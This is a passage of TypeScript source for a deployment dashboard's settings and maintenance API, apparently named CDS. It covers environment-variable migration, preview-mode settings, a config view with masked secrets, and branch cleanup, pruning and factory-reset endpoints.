      if (cls === 'cds-canonical') {
        flow = 'global-only';
      } else if (cls === 'cds-legacy') {
        flow = projectHas && projectVal !== value ? 'duplicate-skip' : 'duplicate';
      } else {
        flow = projectHas && projectVal !== value ? 'move-skip' : 'move';
      }
      plan.push({ key, value, flow, classification: cls, projectExisting: projectVal });
    }

    if (!dryRun) {
      for (const entry of plan) {
        if (entry.flow === 'duplicate') {
          // 两边都写：全局原本就有，项目复制
          stateService.setCustomEnvVar(entry.key, entry.value, targetProjectId);
        } else if (entry.flow === 'move') {
          // 移：项目写 + 全局删
          stateService.setCustomEnvVar(entry.key, entry.value, targetProjectId);
          stateService.removeCustomEnvVar(entry.key, '_global');
        } else if (entry.flow === 'move-skip') {
          // 撞名 + unknown：项目保留原值，全局删
          stateService.removeCustomEnvVar(entry.key, '_global');
        }
        // global-only / duplicate-skip：什么都不做
      }
      stateService.save();
    }

    // 给前端友好的统计 + 分组
    const groups = {
      duplicated: plan.filter(p => p.flow === 'duplicate').map(p => p.key),       // 复制到项目（legacy）
      duplicateSkipped: plan.filter(p => p.flow === 'duplicate-skip').map(p => p.key), // legacy 撞名（两边独立留）
      moved: plan.filter(p => p.flow === 'move').map(p => p.key),                 // 从全局移到项目
      moveSkipped: plan.filter(p => p.flow === 'move-skip').map(p => p.key),      // unknown 撞名（项目原值优先）
      globalOnly: plan.filter(p => p.flow === 'global-only').map(p => p.key),     // CDS_* 留全局
    };

    res.json({
      dryRun,
      targetProjectId,
      groups,
      summary: {
        duplicatedCount: groups.duplicated.length,
        duplicateSkippedCount: groups.duplicateSkipped.length,
        movedCount: groups.moved.length,
        moveSkippedCount: groups.moveSkipped.length,
        globalOnlyCount: groups.globalOnly.length,
        // 总改动数（用户最关心的"会动几个"）
        changeCount: groups.duplicated.length + groups.moved.length + groups.moveSkipped.length,
      },
    });
  });

  // ── Mirror acceleration ──

  router.get('/mirror', (_req, res) => {
    res.json({ enabled: stateService.isMirrorEnabled() });
  });

  router.put('/mirror', (req, res) => {
    const { enabled } = req.body as { enabled?: boolean };
    if (typeof enabled !== 'boolean') {
      res.status(400).json({ error: 'enabled 必须是布尔值' });
      return;
    }
    stateService.setMirrorEnabled(enabled);
    stateService.save();
    res.json({ message: enabled ? '镜像加速已开启' : '镜像加速已关闭', enabled });
  });

  // ── Tab title override ──

  router.get('/tab-title', (_req, res) => {
    res.json({ enabled: stateService.isTabTitleEnabled() });
  });

  router.put('/tab-title', (req, res) => {
    const { enabled } = req.body as { enabled?: boolean };
    if (typeof enabled !== 'boolean') {
      res.status(400).json({ error: 'enabled 必须是布尔值' });
      return;
    }
    stateService.setTabTitleEnabled(enabled);
    stateService.save();
    res.json({ message: enabled ? '标签页标题已开启' : '标签页标题已关闭', enabled });
  });

  // ── Preview mode (per-project，PR_A 之后) ──
  //
  // GET ?projectId=xxx   → 该项目的 mode（fallback 到 legacy state.previewMode）
  // GET 不带 projectId   → legacy state.previewMode（兼容老 settings 页）
  // PUT body { mode, projectId? } → projectId 给则写项目，不给则写 legacy

  // 2026-04-27 边界整理：preview-mode 现在主路径是
  // GET/PUT /api/projects/:id/preview-mode（projects.ts 注册）。
  // 老路径保留兼容，加 Deprecation 响应头让调用方（外部 Agent）能感知。
  router.get('/preview-mode', (req, res) => {
    const projectId = typeof req.query.projectId === 'string' ? req.query.projectId : undefined;
    res.setHeader('Deprecation', 'true');
    res.setHeader('Link', '</api/projects/' + (projectId || '<projectId>') + '/preview-mode>; rel="successor-version"');
    res.json({ mode: stateService.getPreviewModeFor(projectId) });
  });

  router.put('/preview-mode', (req, res) => {
    const { mode, projectId } = req.body as { mode?: string; projectId?: string };
    if (mode !== 'simple' && mode !== 'port' && mode !== 'multi') {
      res.status(400).json({ error: "mode 必须是 'simple' | 'port' | 'multi'" });
      return;
    }
    if (projectId && stateService.getProject(projectId)) {
      stateService.setProjectPreviewMode(projectId, mode);
    } else {
      stateService.setPreviewMode(mode);
    }
    stateService.save();
    res.setHeader('Deprecation', 'true');
    res.setHeader('Link', '</api/projects/' + (projectId || '<projectId>') + '/preview-mode>; rel="successor-version"');
    const labels: Record<string, string> = { simple: '简洁', port: '端口直连', multi: '子域名' };
    res.json({ message: `预览模式已切换为：${labels[mode]}`, mode });
  });

  // ── Config (read-only) ──

  router.get('/config', async (_req, res) => {
    const customEnv = stateService.getCustomEnv();

    // GitHub repo URL: prefer explicit config from UI env vars, fallback to git remote auto-detection
    let githubRepoUrl = customEnv.GITHUB_REPO_URL || '';
    if (!githubRepoUrl) {
      try {
        const result = await shell.exec('git remote get-url origin', { cwd: config.repoRoot, timeout: 5000 });
        const remote = result.stdout.trim();
        // Match patterns: git@github.com:owner/repo.git, https://github.com/owner/repo.git, or proxy /git/owner/repo
        const sshMatch = remote.match(/github\.com[:/]([^/]+\/[^/.]+)/);
        const httpMatch = remote.match(/github\.com\/([^/]+\/[^/.]+)/);
        const proxyMatch = remote.match(/\/git\/([^/]+\/[^/.]+)/);
        const match = sshMatch || httpMatch || proxyMatch;
        if (match) {
          githubRepoUrl = `https://github.com/${match[1].replace(/\.git$/, '')}`;
        }
      } catch { /* ignore */ }
    }

    // CDS git commit short hash for version identification
    let cdsCommitHash = '';
    try {
      const result = await shell.exec('git rev-parse --short HEAD', { cwd: config.repoRoot, timeout: 3000 });
      cdsCommitHash = result.stdout.trim();
    } catch { /* ignore */ }

    res.json({
      ...config,
      githubRepoUrl,
      cdsCommitHash,
      jwt: { ...config.jwt, secret: '***' },
      executorToken: config.executorToken ? '***' : undefined,
      sharedEnv: Object.fromEntries(
        Object.entries(config.sharedEnv).map(([k, v]) => [k, k.includes('PASSWORD') || k.includes('SECRET') ? '***' : v]),
      ),
      executors: Object.values(stateService.getExecutors()),
      previewMode: stateService.getPreviewMode(),
    });
  });

  // ── Check updates (compare local vs remote for all branches) ──

  router.get('/check-updates', async (_req, res) => {
    const state = stateService.getState();
    const branches = Object.values(state.branches);

    // Fetch latest remote refs once
    try {
      const auth = await gitAuthForRepo(config.repoRoot);
      await shell.exec(
        'GIT_TERMINAL_PROMPT=0 git fetch origin --prune',
        { cwd: config.repoRoot, timeout: 30_000, env: auth.env },
      );
    } catch {
      // If fetch fails, we can still compare with last known remote state
    }

    const updates: Record<string, { behind: number; latestRemoteSubject?: string }> = {};

    await Promise.all(branches.map(async (b) => {
      try {
        // Count commits local is behind remote
        const behindResult = await shell.exec(
          `git rev-list --count HEAD..origin/${b.branch} 2>/dev/null || echo 0`,
          { cwd: b.worktreePath, timeout: 10_000 },
        );
        const behind = parseInt(behindResult.stdout.trim()) || 0;

        let latestRemoteSubject: string | undefined;
        if (behind > 0) {
          const subjectResult = await shell.exec(
            `git log -1 --format=%s origin/${b.branch}`,
            { cwd: b.worktreePath, timeout: 5_000 },
          );
          latestRemoteSubject = subjectResult.stdout.trim();
        }

        if (behind > 0) {
          updates[b.id] = { behind, latestRemoteSubject };
        }
      } catch {
        // Branch may not have a remote tracking branch — skip
      }
    }));

    res.json({ updates });
  });

  // ── Cleanup all non-default branches ──

  // ── Cleanup cross-project service pollution ──
  //
  // During the pre-project-scoped era a branch's entry.services could
  // accidentally collect service records for profiles that belong to
  // OTHER projects (most often when a deploy iterated the global
  // buildProfiles list rather than project-scoped). After fixing the
  // root cause, these stale entries still sit in state.json and show
  // up in the dashboard as ghost chips.
  //
  // This endpoint walks every branch, cross-references its entry.services
  // against the set of profiles that actually belong to its projectId,
  // and drops any entry whose profile belongs to someone else. It also
  // best-effort stops the orphan container if any is running.
  //
  // Idempotent, safe to run multiple times. Returns a summary so the
  // operator can see what was trimmed.
  router.post('/cleanup-cross-project-services', async (req, res) => {
    try {
      const allBranches = Object.values(stateService.getState().branches || {});
      const trimmed: Array<{ branchId: string; dropped: string[] }> = [];
      const skippedBusy: Array<{ branchId: string; profileId: string; reason: string }> = [];
      const requestId = String((req as any).cdsRequestId || req.headers['x-cds-request-id'] || '').trim() || null;
      const actor = resolveActorFromRequest(req);
      const trigger = triggerFromRequest(req);

      for (const entry of allBranches) {
        // effective(项目底座 + 本分支额外):否则分支级额外服务会被当成「项目里没有的孤儿服务」
        // 误剪掉。额外服务是这条分支的合法服务,必须算进「已知 profile id」集合。
        const ownProfileIds = new Set(
          stateService.getEffectiveProfilesForBranch(entry).map((p) => p.id),
        );
        const dropped: string[] = [];
        for (const profileId of Object.keys(entry.services || {})) {
          if (!ownProfileIds.has(profileId)) {
            const svc = entry.services[profileId];
            const active = branchOperationCoordinator?.getActive(entry.id);
            if (active) {
              skippedBusy.push({ branchId: entry.id, profileId, reason: `同分支已有写操作正在运行: ${active.request.kind}` });
              serverEventLogStore?.record({
                category: 'container',
                severity: 'warn',
                source: 'api.cleanup-cross-project-services',
                action: 'app.cross-project-service.cleanup-skipped',
                message: `skip cross-project polluted service ${entry.id}/${profileId}: branch operation active`,
                projectId: entry.projectId,
                branchId: entry.id,
                profileId,
                requestId,
                operationId: active.operationId,
                operationKind: active.request.kind,
                operationTrigger: active.request.trigger,
                operationActor: active.request.actor || null,
                operationSource: active.request.source || null,
                details: {
                  requestId,
                  actor,
                  trigger,
                  activeOperationId: active.operationId,
                  activeKind: active.request.kind,
                  reason: 'branch-operation-active',
                },
              });
              continue;
            }
            const branchOperationLease = beginSilentBranchOperation(req, entry, {
              kind: 'cleanup-orphans',
              profileId,
              source: 'api.cleanup-cross-project-services',
              reason: `清理跨项目污染服务 ${profileId}`,
            });
            if (branchOperationCoordinator && !branchOperationLease) {
              skippedBusy.push({ branchId: entry.id, profileId, reason: '同分支已有写操作正在运行' });
              serverEventLogStore?.record({
                category: 'container',
                severity: 'warn',
                source: 'api.cleanup-cross-project-services',
                action: 'app.cross-project-service.cleanup-skipped',
                message: `skip cross-project polluted service ${entry.id}/${profileId}: branch operation active`,
                projectId: entry.projectId,
                branchId: entry.id,
                profileId,
                requestId,
                details: {
                  requestId,
                  actor,
                  trigger,
                  reason: 'branch-operation-active',
                },
              });
              continue;
            }
            let branchOperationFinalStatus: 'completed' | 'failed' | 'cancelled' = 'completed';
            try {
              assertBranchOperationCurrent(branchOperationLease, `cleanup cross-project before ${profileId}`);
              // Best-effort stop the orphan container.
              if (svc?.containerName) {
                try {
                  await containerService.remove(svc.containerName, {
                    projectId: entry.projectId,
                    branchId: entry.id,
                    profileId,
                    requestId,
                    operationId: branchOperationLease?.operationId || null,
                    actor,
                    trigger,
                    operation: 'cleanup-cross-project-services',
                    source: 'api.cleanup-cross-project-services',
                    reason: `清理跨项目污染服务 ${profileId}`,
                  });
                } catch { /* already gone */ }
              }
              assertBranchOperationCurrent(branchOperationLease, `cleanup cross-project before state delete ${profileId}`);
              delete entry.services[profileId];
              dropped.push(profileId);
            } catch (err) {
              branchOperationFinalStatus = err instanceof BranchOperationSupersededError ? 'cancelled' : 'failed';
              skippedBusy.push({ branchId: entry.id, profileId, reason: (err as Error).message });
            } finally {
              completeBranchOperation(branchOperationLease, branchOperationFinalStatus);
            }
          }
        }
        if (dropped.length > 0) {
          trimmed.push({ branchId: entry.id, dropped });
        }
      }
      if (trimmed.length > 0) stateService.save();

      res.json({
        trimmedCount: trimmed.reduce((a, t) => a + t.dropped.length, 0),
        skippedBusyCount: skippedBusy.length,
        branches: trimmed,
        skippedBusy,
      });
    } catch (err) {
      res.status(500).json({ error: (err as Error).message });
    }
  });

  router.post('/cleanup', async (req, res) => {
    initSSE(res);
    try {
      // Optional ?project=<id> scopes the cleanup to one project's
      // branches. Without the filter, all non-default branches across
      // every project are removed (pre-feature global behaviour).
      const projectFilter = typeof req.query.project === 'string' ? req.query.project : null;

      const state = stateService.getState();
      const toRemove = Object.values(state.branches).filter((b) => {
        if (b.id === state.defaultBranch) return false;
        if (projectFilter && (b.projectId || 'default') !== projectFilter) return false;
        return true;
      });
      let removedCount = 0;
      const skippedBusy: Array<{ branchId: string; reason: string }> = [];
      for (const entry of toRemove) {
        const branchOperationLease = beginSilentBranchOperation(req, entry, {
          kind: 'cleanup-orphans',
          source: 'api.cleanup',
          reason: projectFilter ? `清理项目 ${projectFilter} 的非默认分支` : '全局清理非默认分支',
        });
        if (branchOperationCoordinator && !branchOperationLease) {
          skippedBusy.push({ branchId: entry.id, reason: '同分支已有写操作正在运行' });
          sendSSE(res, 'step', { step: 'cleanup', status: 'warning', title: `跳过 ${entry.id}：同分支已有写操作正在运行` });
          continue;
        }
        let branchOperationFinalStatus: 'completed' | 'failed' | 'cancelled' = 'completed';
        try {
          sendSSE(res, 'step', { step: 'cleanup', status: 'running', title: `正在删除 ${entry.id}...` });
          await archiveBranchContainerLogs({
            stateService,
            containerService,
            branch: entry,
            source: 'cleanup',
            serverEventLogStore,
            message: 'captured before cleanup removes branch containers',
            requestId: String((req as any).cdsRequestId || req.headers['x-cds-request-id'] || '').trim() || null,
            operationId: branchOperationLease?.operationId || null,
            actor: resolveActorFromRequest(req),
            trigger: triggerFromRequest(req),
          });
          for (const svc of Object.values(entry.services)) {
            assertBranchOperationCurrent(branchOperationLease, `cleanup before ${svc.profileId}`);
            try {
              await containerService.remove(svc.containerName, {
                projectId: entry.projectId,
                branchId: entry.id,
                profileId: svc.profileId,
                requestId: String((req as any).cdsRequestId || req.headers['x-cds-request-id'] || '').trim() || null,
                operationId: branchOperationLease?.operationId || null,
                actor: resolveActorFromRequest(req),
                trigger: 'cleanup',
                operation: 'cleanup-all-branches',
                source: 'api.cleanup',
                reason: projectFilter ? `清理项目 ${projectFilter} 的非默认分支` : '全局清理非默认分支',
              });
            } catch { /* ok */ }
          }
          assertBranchOperationCurrent(branchOperationLease, 'cleanup before worktree remove');
          try {
            const repoRoot = stateService.getProjectRepoRoot(entry.projectId, config.repoRoot);
            await worktreeService.remove(repoRoot, entry.worktreePath);
          } catch { /* ok */ }
          assertBranchOperationCurrent(branchOperationLease, 'cleanup before state delete');
          // 删分支即删分支网（Codex P2「Remove branch networks from all cleanup flows」）。
          await containerService.removeBranchNetwork(entry.id).catch(() => { /* best-effort */ });
          stateService.removeLogs(entry.id);
          stateService.removeBranch(entry.id);
          removedCount += 1;
          sendSSE(res, 'step', { step: 'cleanup', status: 'done', title: `已删除 ${entry.id}` });
        } catch (err) {
          branchOperationFinalStatus = err instanceof BranchOperationSupersededError ? 'cancelled' : 'failed';
          skippedBusy.push({ branchId: entry.id, reason: (err as Error).message });
          sendSSE(res, 'step', { step: 'cleanup', status: 'error', title: `删除 ${entry.id} 失败: ${(err as Error).message}` });
        } finally {
          completeBranchOperation(branchOperationLease, branchOperationFinalStatus);
        }
      }
      stateService.save();
      const msg = projectFilter
        ? `已清理项目 ${projectFilter} 的 ${removedCount} 个分支`
        : `已清理 ${removedCount} 个分支`;
      sendSSE(res, 'complete', { message: msg, removedCount, scope: projectFilter || '_all', skippedBusy });
    } catch (err) {
      sendSSE(res, 'error', { message: (err as Error).message });
    } finally {
      res.end();
    }
  });

  // ── Cleanup orphan branches: remove local branches that no longer exist on remote ──

  router.post('/cleanup-orphans', async (req, res) => {
    initSSE(res);
    try {
      // Optional ?project=<id> filter — when the Dashboard is on a
      // specific project page, we only scan/clean that project's
      // branches. Without the filter we fan out to every project so
      // a global "cleanup orphans" from the top-level still works.
      const projectFilter = typeof req.query.project === 'string' ? req.query.project : null;

      const projects = projectFilter
        ? [stateService.getProject(projectFilter)].filter(Boolean) as ReturnType<typeof stateService.getProjects>
        : stateService.getProjects();

      if (projects.length === 0) {
        sendSSE(res, 'complete', { message: projectFilter ? `未知项目: ${projectFilter}` : '没有项目', orphanCount: 0 });
        res.end();
        return;
      }

      // Per-project: resolve repoRoot, fetch remote, intersect with that
      // project's branch entries. Legacy projects without a custom
      // repoPath fall back to config.repoRoot via getProjectRepoRoot.
      // A project whose clone isn't ready (cloneStatus !== 'ready')
      // is skipped — it has no remote to check against.
      const allOrphans: BranchEntry[] = [];
      for (const project of projects) {
        if (project.cloneStatus && project.cloneStatus !== 'ready') {
          sendSSE(res, 'step', { step: `skip-${project.id}`, status: 'info', title: `跳过项目 ${project.name}（clone 未就绪）` });
          continue;
        }
        const projectRepoRoot = stateService.getProjectRepoRoot(project.id, config.repoRoot);
        sendSSE(res, 'step', { step: `fetch-${project.id}`, status: 'running', title: `拉取 ${project.name} 的远程分支...` });
        try {
          const auth = await gitAuthForRepo(projectRepoRoot);
          await shell.exec(
            'GIT_TERMINAL_PROMPT=0 git fetch origin --prune',
            { cwd: projectRepoRoot, timeout: 30_000, env: auth.env },
          );
        } catch (err) {
          sendSSE(res, 'step', { step: `fetch-${project.id}`, status: 'error', title: `${project.name} fetch 失败: ${(err as Error).message}` });
          continue;
        }
        const result = await shell.exec(
          'git for-each-ref --format="%(refname:lstrip=3)" refs/remotes/origin',
          { cwd: projectRepoRoot },
        );
        const remoteBranches = new Set(
          result.stdout.trim().split('\n').filter(Boolean).filter(b => b !== 'HEAD'),
        );
        const projectBranches = stateService.getBranchesForProject(project.id);
        const projectOrphans = projectBranches.filter(b => !remoteBranches.has(b.branch));
        sendSSE(res, 'step', { step: `fetch-${project.id}`, status: 'done', title: `${project.name}: 远程 ${remoteBranches.size} 个分支, 本地 ${projectBranches.length} 个, 孤儿 ${projectOrphans.length} 个` });
        allOrphans.push(...projectOrphans);
      }

      const orphans = allOrphans;

      if (orphans.length === 0) {
        sendSSE(res, 'complete', { message: '没有发现孤儿分支，一切正常', orphanCount: 0 });
        res.end();
        return;
      }

      sendSSE(res, 'step', { step: 'scan', status: 'info', title: `发现 ${orphans.length} 个孤儿分支`, detail: { orphans: orphans.map(b => ({ id: b.id, branch: b.branch })) } });

      const cleanedOrphans: BranchEntry[] = [];
      const skippedBusy: Array<{ branchId: string; reason: string }> = [];

      // Step 3: stop containers + remove worktrees in parallel, then update state
      await Promise.all(orphans.map(async (entry) => {
        const branchOperationLease = beginSilentBranchOperation(req, entry, {
          kind: 'cleanup-orphans',
          source: 'api.cleanup-orphans',
          reason: '远程分支不存在，清理 CDS 孤儿分支容器',
        });
        if (branchOperationCoordinator && !branchOperationLease) {
          skippedBusy.push({ branchId: entry.id, reason: '同分支已有写操作正在运行' });
          sendSSE(res, 'step', { step: `cleanup-${entry.id}`, status: 'warning', title: `跳过 ${entry.branch}：同分支已有写操作正在运行` });
          return;
        }
        let branchOperationFinalStatus: 'completed' | 'failed' | 'cancelled' = 'completed';
        try {
          sendSSE(res, 'step', { step: `cleanup-${entry.id}`, status: 'running', title: `正在清理 ${entry.branch}...` });
          await archiveBranchContainerLogs({
            stateService,
            containerService,
            branch: entry,
            source: 'cleanup',
            serverEventLogStore,
            message: 'captured before orphan cleanup removes branch containers',
            requestId: String((req as any).cdsRequestId || req.headers['x-cds-request-id'] || '').trim() || null,
            operationId: branchOperationLease?.operationId || null,
            actor: resolveActorFromRequest(req),
            trigger: triggerFromRequest(req),
          });

          // Stop all containers for this orphan in parallel
          await Promise.all(
            Object.values(entry.services).map(async (svc) => {
              assertBranchOperationCurrent(branchOperationLease, `cleanup orphan before ${svc.profileId}`);
              return containerService.remove(svc.containerName, {
                projectId: entry.projectId,
                branchId: entry.id,
                profileId: svc.profileId,
                requestId: String((req as any).cdsRequestId || req.headers['x-cds-request-id'] || '').trim() || null,
                operationId: branchOperationLease?.operationId || null,
                actor: resolveActorFromRequest(req),
                trigger: 'cleanup-orphans',
                operation: 'cleanup-orphans',
                source: 'api.cleanup-orphans',
                reason: '远程分支不存在，清理 CDS 孤儿分支容器',
              }).catch(() => { /* ok */ });
            }),
          );
          assertBranchOperationCurrent(branchOperationLease, 'cleanup orphan before worktree remove');
          // Remove worktree
          try {
            const repoRoot = stateService.getProjectRepoRoot(entry.projectId, config.repoRoot);
            await worktreeService.remove(repoRoot, entry.worktreePath);
          } catch { /* ok */ }

          cleanedOrphans.push(entry);
          sendSSE(res, 'step', { step: `cleanup-${entry.id}`, status: 'done', title: `已清理 ${entry.branch}` });
        } catch (err) {
          branchOperationFinalStatus = err instanceof BranchOperationSupersededError ? 'cancelled' : 'failed';
          skippedBusy.push({ branchId: entry.id, reason: (err as Error).message });
          sendSSE(res, 'step', { step: `cleanup-${entry.id}`, status: 'error', title: `清理 ${entry.branch} 失败: ${(err as Error).message}` });
        } finally {
          completeBranchOperation(branchOperationLease, branchOperationFinalStatus);
        }
      }));

      // State mutations are serial (state is in-memory, no async needed)
      for (const entry of cleanedOrphans) {
        // 删分支即删分支网（Codex P2「Remove branch networks from all cleanup flows」）。
        await containerService.removeBranchNetwork(entry.id).catch(() => { /* best-effort */ });
        stateService.removeLogs(entry.id);
        stateService.removeBranch(entry.id);
      }
      const cleaned = cleanedOrphans.length;

      stateService.save();
      sendSSE(res, 'complete', { message: `已清理 ${cleaned} 个孤儿分支`, orphanCount: cleaned, skippedBusy });
    } catch (err) {
      sendSSE(res, 'error', { message: (err as Error).message });
    } finally {
      res.end();
    }
  });

  // ── Prune stale local git branches not in CDS deployment list ──

  router.post('/prune-stale-branches', async (req, res) => {
    initSSE(res);
    try {
      // Optional ?project=<id> filter — same semantics as cleanup-orphans.
      // Without a filter we walk every project so state-level "prune
      // everything" still works. Each project has its own git repo and
      // its own list of deployed branches, so the protected set is
      // computed per-project.
      const projectFilter = typeof req.query.project === 'string' ? req.query.project : null;
      const projects = projectFilter
        ? [stateService.getProject(projectFilter)].filter(Boolean) as ReturnType<typeof stateService.getProjects>
        : stateService.getProjects();

      if (projects.length === 0) {
        sendSSE(res, 'complete', { message: projectFilter ? `未知项目: ${projectFilter}` : '没有项目', pruneCount: 0 });
        res.end();
        return;
      }

      let totalPruned = 0;
      for (const project of projects) {
        if (project.cloneStatus && project.cloneStatus !== 'ready') {
          sendSSE(res, 'step', { step: `skip-${project.id}`, status: 'info', title: `跳过项目 ${project.name}（clone 未就绪）` });
          continue;
        }
        const projectRepoRoot = stateService.getProjectRepoRoot(project.id, config.repoRoot);

        // What's "deployed" for this project = the branches we've
        // registered in CDS under this projectId. Cross-project
        // branches (e.g. default's 'main' when scanning prd-agent-2)
        // must NOT be considered deployed here, or we'd keep fork
        // branches named 'main' as stale just because default has one.
        const projectDeployed = new Set(
          stateService.getBranchesForProject(project.id).map(b => b.branch),
        );

        let currentBranch = '';
        try {
          const currentResult = await shell.exec('git rev-parse --abbrev-ref HEAD', { cwd: projectRepoRoot });
          currentBranch = currentResult.stdout.trim();
        } catch {
          sendSSE(res, 'step', { step: `scan-${project.id}`, status: 'error', title: `${project.name}: 读 HEAD 失败` });
          continue;
        }
        const protectedBranches = new Set([currentBranch, 'main', 'master', 'develop', 'dev']);

        sendSSE(res, 'step', { step: `scan-${project.id}`, status: 'running', title: `扫描 ${project.name} 的本地分支...` });
        const localResult = await shell.exec('git branch --format="%(refname:short)"', { cwd: projectRepoRoot });
        const localBranches = localResult.stdout.trim().split('\n').filter(Boolean);
        const staleBranches = localBranches.filter(b =>
          !projectDeployed.has(b) && !protectedBranches.has(b),
        );
        sendSSE(res, 'step', {
          step: `scan-${project.id}`, status: 'done',
          title: `${project.name}: 本地 ${localBranches.length}, 已部署 ${projectDeployed.size}, 待清 ${staleBranches.length}`,
        });
        for (const branch of staleBranches) {
          sendSSE(res, 'step', { step: `del-${project.id}-${branch}`, status: 'running', title: `删除 ${project.name} / ${branch}...` });
          try {
            await shell.exec(`git branch -D "${branch}"`, { cwd: projectRepoRoot });
            totalPruned++;
            sendSSE(res, 'step', { step: `del-${project.id}-${branch}`, status: 'done', title: `已删除 ${project.name} / ${branch}` });
          } catch (err) {
            sendSSE(res, 'step', { step: `del-${project.id}-${branch}`, status: 'error', title: `删除失败 ${project.name} / ${branch}: ${(err as Error).message}` });
          }
        }
      }

      sendSSE(res, 'complete', { message: `已清理 ${totalPruned} 个非列表分支`, pruneCount: totalPruned });
    } catch (err) {
      sendSSE(res, 'error', { message: (err as Error).message });
    } finally {
      res.end();
    }
  });

  // ── Factory reset: stop all containers, clear all config, keep Docker volumes ──

  router.post('/factory-reset', async (req, res) => {
    initSSE(res);
    try {
      // Optional ?project=<id> scopes the reset to that project only:
      //   - stop/remove only that project's containers + worktrees
      //   - clear only that project's buildProfiles / infra / routing
      //   - clear only that project's customEnv bucket (_global untouched)
      //   - the Project entity itself stays (so the user doesn't have
      //     to recreate it + re-clone the repo)
      //
      // Without the filter, pre-feature behaviour applies: nuke EVERY
      // project's state and reset CDS to an empty-slate install.
      const projectFilter = typeof req.query.project === 'string' ? req.query.project : null;
      const state = stateService.getState();

      if (projectFilter) {
        const project = stateService.getProject(projectFilter);
        if (!project) {
          sendSSE(res, 'error', { message: `项目 ${projectFilter} 不存在` });
          res.end();
          return;
        }

        // 1. Stop + remove that project's branches
        const branches = Object.values(state.branches)
          .filter((b) => (b.projectId || 'default') === projectFilter);
        for (const entry of branches) {
          const branchOperationLease = beginSilentBranchOperation(req, entry, {
            kind: 'factory-reset',
            source: 'api.factory-reset',
            reason: `项目 ${projectFilter} 恢复出厂设置`,
          });
          if (branchOperationCoordinator && !branchOperationLease) {
            sendSSE(res, 'step', { step: 'reset', status: 'warning', title: `跳过分支 ${entry.id}：同分支已有写操作正在运行` });
            continue;
          }
          let branchOperationFinalStatus: 'completed' | 'failed' | 'cancelled' = 'completed';
          try {
          sendSSE(res, 'step', { step: 'reset', status: 'running', title: `停止分支 ${entry.id}...` });
          for (const svc of Object.values(entry.services)) {
            assertBranchOperationCurrent(branchOperationLease, `factory reset before ${svc.profileId}`);
            try {
              await containerService.remove(svc.containerName, {
                projectId: entry.projectId,
                branchId: entry.id,
                profileId: svc.profileId,
                requestId: String((req as any).cdsRequestId || req.headers['x-cds-request-id'] || '').trim() || null,
                operationId: branchOperationLease?.operationId || null,
                actor: resolveActorFromRequest(req),
                trigger: 'factory-reset',
                operation: 'factory-reset-project',
                source: 'api.factory-reset',
              reason: `项目 ${projectFilter} 恢复出厂设置`,
            });
            } catch { /* ok */ }
          }
          assertBranchOperationCurrent(branchOperationLease, 'factory reset before worktree remove');
          try {
            const repoRoot = stateService.getProjectRepoRoot(entry.projectId, config.repoRoot);
            await worktreeService.remove(repoRoot, entry.worktreePath);
          } catch { /* ok */ }
          assertBranchOperationCurrent(branchOperationLease, 'factory reset before state delete');
          // 删分支即删分支网（Codex P2「Remove branch networks from all cleanup flows」）。
          await containerService.removeBranchNetwork(entry.id).catch(() => { /* best-effort */ });
          stateService.removeLogs(entry.id);
          stateService.removeBranch(entry.id);
          } catch (err) {
            branchOperationFinalStatus = err instanceof BranchOperationSupersededError ? 'cancelled' : 'failed';
            throw err;
          } finally {
            completeBranchOperation(branchOperationLease, branchOperationFinalStatus);
          }
        }

        // 2. Stop + remove that project's infra containers (volumes preserved).
        //    We intentionally call getInfraServicesForProject before mutation
        //    and container operations so a partial failure still reports
        //    the right count.
        const infra = stateService.getInfraServicesForProject(projectFilter);
        for (const svc of infra) {
          sendSSE(res, 'step', { step: 'reset', status: 'running', title: `停止基础设施 ${svc.name}...` });
          try {
            await containerService.remove(svc.containerName, {
              projectId: svc.projectId,
              serviceId: svc.id,
              requestId: String((req as any).cdsRequestId || req.headers['x-cds-request-id'] || '').trim() || null,
              actor: resolveActorFromRequest(req),
              trigger: 'factory-reset',
              operation: 'factory-reset-project-infra',
              source: 'api.factory-reset',
              reason: `项目 ${projectFilter} 恢复出厂设置时停止基础设施 ${svc.name}`,
            });
          } catch { /* ok */ }
        }

        // 3. Remove this project's profiles / infra / routing / env bucket
        //    from state. Keep the Project entity + its dockerNetwork so
        //    the user doesn't have to recreate the project shell.
        //    getState() returns Readonly<CdsState>; cast away so we can
        //    replace the arrays in place (the same pattern as the
        //    global-reset branch below).
        const removedProfiles = stateService
          .getBuildProfilesForProject(projectFilter).length;
        const mutableState = state as unknown as {
          buildProfiles: BuildProfile[];
          infraServices: InfraService[];
          routingRules: RoutingRule[];
        };
        mutableState.buildProfiles = (state.buildProfiles || [])
          .filter((p) => (p.projectId || 'default') !== projectFilter);
        mutableState.infraServices = (state.infraServices || [])
          .filter((s) => (s.projectId || 'default') !== projectFilter);
        mutableState.routingRules = (state.routingRules || [])
          .filter((r) => (r.projectId || 'default') !== projectFilter);
        stateService.dropCustomEnvScope(projectFilter);
        stateService.save();

        sendSSE(res, 'complete', {
          message: `项目 ${project.name} 已重置：清除 ${branches.length} 个分支、${infra.length} 个基础设施、${removedProfiles} 个构建配置、环境变量作用域。项目实体 + Docker 数据卷保留。`,
          scope: projectFilter,
          removedBranches: branches.length,
          removedInfra: infra.length,
          removedProfiles,
        });
        return;
      }

      // ── Global factory-reset (all projects) — pre-feature path ──

      // 1. Stop and remove all branch containers + worktrees
      const branches = Object.values(state.branches);
      for (const entry of branches) {
        const branchOperationLease = beginSilentBranchOperation(req, entry, {
          kind: 'factory-reset',
          source: 'api.factory-reset',
          reason: '全局恢复出厂设置',
        });
        if (branchOperationCoordinator && !branchOperationLease) {
          sendSSE(res, 'step', { step: 'reset', status: 'warning', title: `跳过分支 ${entry.id}：同分支已有写操作正在运行` });
          continue;
        }
        let branchOperationFinalStatus: 'completed' | 'failed' | 'cancelled' = 'completed';
        try {
        sendSSE(res, 'step', { step: 'reset', status: 'running', title: `停止分支 ${entry.id}...` });
        for (const svc of Object.values(entry.services)) {
          assertBranchOperationCurrent(branchOperationLease, `factory reset before ${svc.profileId}`);
          try {
            await containerService.remove(svc.containerName, {
              projectId: entry.projectId,
              branchId: entry.id,
              profileId: svc.profileId,
              requestId: String((req as any).cdsRequestId || req.headers['x-cds-request-id'] || '').trim() || null,
              operationId: branchOperationLease?.operationId || null,
              actor: resolveActorFromRequest(req),
              trigger: 'factory-reset',
              operation: 'factory-reset-global',
              source: 'api.factory-reset',
            reason: '全局恢复出厂设置',
          });
          } catch { /* ok */ }
        }
        assertBranchOperationCurrent(branchOperationLease, 'factory reset before worktree remove');
        try {
